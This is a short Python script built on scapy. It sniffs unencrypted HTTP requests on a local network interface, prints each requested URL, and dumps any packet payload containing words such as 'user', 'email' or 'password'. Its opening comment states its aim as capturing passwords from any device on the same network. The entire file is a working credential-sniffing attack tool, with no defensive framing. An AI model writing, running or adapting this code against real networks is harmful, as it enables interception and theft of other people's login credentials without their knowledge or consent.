#capturing password from any device connected to same network

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			keywords = ["username".encode(), "name".encode(), "user".encode(), "uname".encode(), "email".encode(), "usr".encode(), "login".encode(), "password".encode(), "pass".encode(), "pwd".encode(), "passwd".encode()]
			for keyword in keywords:
				if keyword in load:
					return load


					
def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		#print(packet.show())
		#In http request layer fields such as Host contain the 1st part of url(i.e domain name) and path contains the rest of url
		url = get_url(packet)
		print("[+] HTTP Request >>> " + format(url))

		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+] Possible username/password >> " + format(login_info) + "\n\n")


sniff("eth0")	